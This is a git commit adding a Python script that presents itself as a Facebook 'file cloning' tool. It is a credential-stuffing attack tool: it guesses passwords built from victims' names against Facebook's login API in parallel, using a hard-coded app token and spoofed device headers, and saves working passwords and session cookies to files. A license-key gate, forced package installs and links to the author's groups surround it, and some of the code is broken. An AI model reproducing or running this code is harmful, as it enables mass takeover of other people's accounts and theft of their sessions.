49863d65941c0dd122a53b21dcacbc3b1dc7ab99
rahadbaby147 <154975404+rahadbaby147@users.noreply.github.com>
2024-06-06 07:34:56 +0600

    Add files via upload

---
+++ birthday.py
@@ -0,0 +1,386 @@
+import os
+import httpx
+from os import system as osRUB
+from os import system as cmd
+import os,time,platform
+import os, platform, time, sys
+#os.system('clear')
+print(' [\x1b[38;5;48m●\033[1;37m]\x1b[38;5;46m CHECKING UPDATE...!\033[1;37m [\x1b[38;5;48m●\033[31;1m●\x1b[1;93m●\033[1;37m]\033[1;37m')
+time.sleep(2)
+os.system('clear')
+print('\033[1;97m[\x1b[38;5;48m●\033[1;37m] \x1b[38;5;50mJOIN MY PUBLIC GROUP ')
+time.sleep(0.1)
+os.system(f'xdg-open https://facebook.com/groups/1262793254610940/')
+os.system('clear')
+print('\x1b[38;5;46mLoding...\x1b[38;5;196m[\x1b[38;5;46mMrDevilEx\x1b[38;5;196m]\x1b[38;5;46m')
+time.sleep(2)
+try:
+    import requests 
+except ImportError:
+    print('\n  installing Requests ...\n')
+    os.system('pip install requests')
+try:
+    import requests 
+except ImportError:
+    print('\n  installing httpx...\n')
+    os.system('pip install httpx')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n  installing futures ...\n')
+    os.system('pip install futures')
+try:
+    import mechanize
+except ModuleNotFoundError:
+    os.system('pip install mechanize > /dev/null')
+from urllib.request import Request, urlopen
+import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+from concurrent.futures import ThreadPoolExecutor as MAHADIMAHADI
+from string import * 
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+import os, platform
+from concurrent.futures import ThreadPoolExecutor
+fast_work = ThreadPoolExecutor(max_workers=15).submit 
+model2 = requests.get('https://facebook.com/groups/1262793254610940/').text.splitlines()
+totaldmp = 0
+count = 0
+loop = 0
+oks = []
+cps = []
+id = []
+ps = []
+sid = []
+total=[]
+methods = []
+srange = 0
+saved = []
+totaldmp = 0
+filter = []    
+sim_id = ''
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+fblc = 'en_US'
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+except:
+        fbcr = 'Zong'
+fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+fbdv = model
+fbsv = android_version
+fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
+fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
+        total = 0
+        for i in fbcr:
+                total+=1
+        select = ('1','2')
+        if select == '1':
+                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+                sim_id+=fbcr
+        elif select == '2':
+                try:
+                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
+                        sim_id+=fbcr
+                except Exception as e:
+                        fbcr = "Zong"
+                        sim_id+=fbcr
+        else:
+                fbcr = 'Zong'
+                sim_id+=fbcr
+except:
+        fbcr = "Zong"
+device = {
+        'android_version':android_version,
+        'model':model,
+        'build':build,
+        'fblc':fblc,
+        'fbmf':fbmf,
+        'fbbd':fbbd,
+        'fbdv':model,
+        'fbsv':fbsv,
+        'fbca':fbca,
+        'fbdm':fbdm}
+
+yellow = "\x1b[38;5;208m"
+black="\033[1;30m"
+rad="\033[1;31m"
+green="\x1b[38;5;47m"
+yelloww="\033[1;33m"
+blue="\033[1;34m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+white="\033[1;37m"
+faltu = "\033[1;41m"
+pvt = "\033[1;0m"
+my_color = [white,blue,green]
+warna = random.choice(my_color)
+
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+#+++++++++++M1-USERAGENT+++++++++++#
+def M3():
+    ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(10, 99))+".0.0."+str(random.randint(1000, 9999))+";[FBAN/FB4A;FBAV/85.0.0.15.70;FBBV/33678595;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G532M;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    return ua
+
+def USERAGENT():
+  android_version=random.randint(5,15)
+  FBAV=f"{random.randint(180,500)}.0.0.{random.randint(1,999)}.{random.randint(1,999)}"
+  FBBV=random.randint(100000000,999999999)
+  networks = ["Airtel", "Grameenphone", "Robi", "Banglalink", "LTE", "WIFI"]
+  FBCR=random.choice(networks)
+#-------------USERAGENT STRING-------------#
+  USERAGENT=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+  return USERAGENT
+    
+
+
+##UA: [FBAN/FB4A;FBAV/22.0.0.55.136;FBBV/47466099;[FBAN/FB4A;FBAV/22.0.0.55.136;FBLC/en_US;FBBV/47466099;FBCR/Telefonica;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.orca;FBDV/Lenovo L71061;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1039,height=1731]
+#+++++++++++M2-USERAGENT+++++++++++#
+def useragentMAHADI():
+    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/85070460;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500F;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
+    return ua
+def Personal():
+    ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/39.0.0.7495;FBBV/8447378;FBDM/{density= ,width=720,height=1280};FBLC/en_US;FBRV/9467474;FBCR/banglalink;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.adsmanager;FBDV/Lenovo L71061;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    return ua
+sys.stdout.write('\x1b]2; =[⚕️]=[MrDevilEx-XD]=[⚜️]=\x07')    
+S = '\033[1;97m'
+A = '\x1b[38;5;208m'
+R = '\x1b[38;5;46m'
+F = ' '
+Z = '\033[1;33m'
+head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
+#+++++++++++LOGO+++++++++++#
+logo=(f'''
+\x1b[38;5;82m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+\x1b[38;5;82m┃\x1b[38;5;82m___  _    ____ ____ _  _    ___  ____ _  _ _ _┃\x1b[38;5;84mFB  \x1b[38;5;84m: \033[33;1mPRINCE LIKHON\x1b[38;5;82m┃
+\x1b[38;5;82m┃\x1b[38;5;83m|__] |    |__| |    |_/     |  \ |___ |  | | |┃\x1b[38;5;84mCEO\x1b[38;5;84m : \x1b[38;5;82mLikhon       \x1b[38;5;82m┃
+\x1b[38;5;82m┃\x1b[38;5;84m|__] |___ |  | |___ | \_    |__/ |___  \/  | |┃\x1b[38;5;84mGIT \x1b[38;5;84m: \033[35;1mMrDevilEx    \x1b[38;5;82m┃
+\x1b[38;5;82m┣━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+\x1b[38;5;82m┃ \x1b[38;5;82mTOOL : \x1b[38;5;84mFILE      \x1b[38;5;82m\x1b[38;5;82m┃ \x1b[38;5;82mWP \x1b[38;5;84m: \x1b[38;5;82m+966578146776\x1b[38;5;82m┃  \x1b[38;5;84mVERSION \x1b[38;5;82m: \033[31;1mX\x1b[38;5;82m              ┃
+\x1b[38;5;82m╚━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝''')
+#================OK-CP-RESULT==============#    
+def result(OKs,cps):
+    if len(OKs) != 0 or len(cps) != 0:
+        print('')
+        print(f'\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        print('\033[1;97m[\x1b[38;5;47m≈\033[1;97m] \033[1;97mTHE PROGRESS HAS BEEN COMPLETE ')
+        print('\033[1;97m[\x1b[38;5;47m≈\033[1;97m] \033[1;97mTOTAL OK ID:\x1b[38;5;47m %s' % str(len(oks)))
+        print('\033[1;97m[\x1b[38;5;47m≈\033[1;97m] \033[1;97mTOTAL CP ID:\033[1;30m %s' % str(len(cps)))
+        print(f'\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        input("Press enter to back MAHADI Menu ")
+        exit()
+#++++++++++++++++++MAIN-MENU++++++++++++++#
+def MAHADI():   
+    os.system('clear')
+    print(logo)
+    print("\x1b[38;5;196m[\x1b[38;5;49m1\x1b[38;5;196m]\x1b[38;5;46m FILE CLONING\033[1;37m")
+    print("\x1b[38;5;196m[\x1b[38;5;49m2\x1b[38;5;196m]\x1b[38;5;48m CONTACT ADMIN\033[1;37m")
+    print("\x1b[38;5;196m[\x1b[38;5;49m0\x1b[38;5;196m]\x1b[38;5;49m EXIT")
+    print(f'\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    select = input('Select Menu :\033[1;35m ')
+    if select =='1':
+        method_crack()
+    elif select =='2':
+        os.system(f'xdg-open https://www.facebook.com/profile.php?id=100094542662459&mibextid=ZbWKwL')
+        MAHADI()        
+    elif select =='0':
+        exit()
+    else:
+        print('\x1b[38;5;46m Select Valid Option ...')
+    time.sleep(2)
+#+++++++++++++++METHOD-MENU++++++++++++#        
+def method_crack():
+    global methods
+    os.system('clear')
+    print(logo)
+    print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m METHOD ❯ 1')
+    print(f'\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    option = input('Select method:\033[1;97m ')
+    if option =='1':
+        methods.append('methodA')
+        main_crack().crack(id)
+    elif option =='2':
+        methods.append('methodB')
+        main_crack().crack(id)
+    elif option =='3':
+        methods.append('methodC')
+        main_crack().crack(id)
+    else:
+      print('\n Select Valid Option ...')
+      time.sleep(2)
+      method_crack()
+#+++++++++FILE-PATH+++++++++#
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        os.system('clear')
+        print(logo)
+        self.file = input('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m ENTER FILE PATH :\x1b[38;5;47m ')
+        try:
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print('Opps File Not Found ...')
+            time.sleep(2)
+            os.system('clear')
+            print(logo)
+            print('Try Again ...')
+            time.sleep(2)
+            main_crack().crack(id)
+#===============M1 METHOD==============#            
+    
+    def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r\x1b[38;5;196m[\x1b[38;5;47mMAHADI-M1\x1b[38;5;196m]\x1b[38;5;47m-\x1b[38;5;196m[\x1b[38;5;81m{loop}\x1b[38;5;196m]\x1b[38;5;47m-\x1b[38;5;196m[\x1b[38;5;47mOK:\x1b[38;5;47m{len(oks)}\x1b[38;5;196m]\x1b[38;5;47m-\x1b[38;5;196m[{S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}\x1b[38;5;196m]")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": sid,
+"password": ps,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': useragentMAHADI(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;sid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);MAHADIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={MAHADIb};{ckkk}"
+                    print(f"\r\x1b[38;5;196m[\x1b[38;5;46mMAHADI-💚\x1b[38;5;196m]\x1b[38;5;46m {sid} \x1b[38;5;196m●\x1b[38;5;46m {ps} ")
+                    oks.append(sid)
+                    open('/sdcard/MAHADI•OKEY•M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MAHADI•COOKIE•M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                     print("{A}r{M}[MAHADI-CP] {sid} ● {ps} {S}")
+                     cps.append(sid)
+                     open('/sdcard/MAHADI-CP.txt','a').write(sid+'|'+ps+'\n')
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            smethodAhodA(self, sid, name, psw)
+
+#++++++++++++±+++++METHOD-PASW-MENU+++++++++++++++++#            
+    def pasw(self):       
+            pw = []
+            os.system('clear')
+            print(logo)
+            sl = int(input('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m ENTER PASSWORD LIMIT : \033[1;97m'))
+            os.system("clear")
+            print(logo)
+            print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;196m|\x1b[38;5;46m first123')
+            print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ') 
+            print(f'\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+            if sl =='':
+                print('\n Put limit between 1 to 30')
+            elif sl > 30:
+                print('\nPassword limit Should Not Be Greater Than 30')
+            else:
+                for sr in range(sl):
+                    pw.append(input(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m ENTER PASSWORD {sr+1}\033[1;97m : \033[1;33m'))
+                    print(f'\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+            os.system("clear")
+            print(logo)
+            print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;47m TOTAL ACCOUNT\033[1;97m :\x1b[38;5;47m %s ' % len(self.id))
+            print(f"\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;48m LIMIT OF PASS \033[1;97m:\x1b[38;5;48m {sl}\033[1;37m")
+            print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m] \033[38;5;49mIF NO RESULT [\x1b[38;5;46mON\033[1;37m/\033[1;33mOFF\x1b[38;5;49m] \x1b[38;5;49mAIRPLAN MODE')
+            print(f'\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+            with MAHADIMAHADI(max_workers=30) as MAHADIworld:
+                for zsb in self.id:
+                   try:
+                       uid, name = zsb.split('|')
+                       sz = name.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                           pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                MAHADIworld.submit(self.methodA, uid, name, pwx)
+                   except:pass
+            result(oks,cps)
+#++++++++LICENCES++++++++#
+import getpass
+attemps = 0
+os.system('clear')
+print(logo)
+while attemps < 999999999998888888888889999999999999999999999999999:
+    username = input(f'\x1b[38;5;196m[\x1b[38;5;46m⭐\x1b[38;5;196m]\x1b[38;5;46m PUT LICENSE ❯ ')
+    os.system('clear');print(logo)
+    if username == '007':
+        print('\x1b[38;5;196m[\x1b[38;5;46m✅\x1b[38;5;196m]\x1b[38;5;48mSUCCESSFUL LICENSE')
+        break
+    else:
+        print('\x1b[38;5;196m[\x1b[38;5;46m×\x1b[38;5;196m]\x1b[38;5;47mINCORRECT LICENSE \x1b[38;5;46m[❌\x1b[38;5;46m] ')
+        time.sleep(0.2)
+        os.system('clear')
+        print(logo)
+        attemps += 1
+        continue
+import os,httpx
+def approval():
+    MTW="MAHADI+"
+    MTW191="MIM"
+    uuid=str(os.getuid()) + str(os.getlogin())
+    key = "-".join(uuid)
+    ress=httpx.get("https://github.com/Mr-Devil-404/Server/blob/main/MrDevilEx.txt").text#tyour approval link
+    if key in ress:
+        MAHADI()
+    else:
+        print("\033[1;97m[\033[1;32m+\033[1;97m] \033[1;32mKEY IS NOT APPROVED")
+        os.system("clear")
+        print(logo)
+        print("\033[1;97m[\033[1;32m+\033[1;97m] \033[1;32mPAID BUT FREE\033[1;97m ● \033[1;32mFOR FRIEND ")
+        print("\033[1;97m[\033[1;32m+\033[1;97m] \033[1;32mYour key :\x1b[1;96m "+MTW+MTW191+key)
+        print(41*'\033[1;97m—')
+        name = input("\033[1;97m[\033[1;97m≈\033[1;97m] \033[1;32mYOUR NAME : ")
+        os.system("xdg-open https://wa.me/+966578146776")
+approval()
+        
+#++++++++++++++APPROVAL+++++++++++++++#
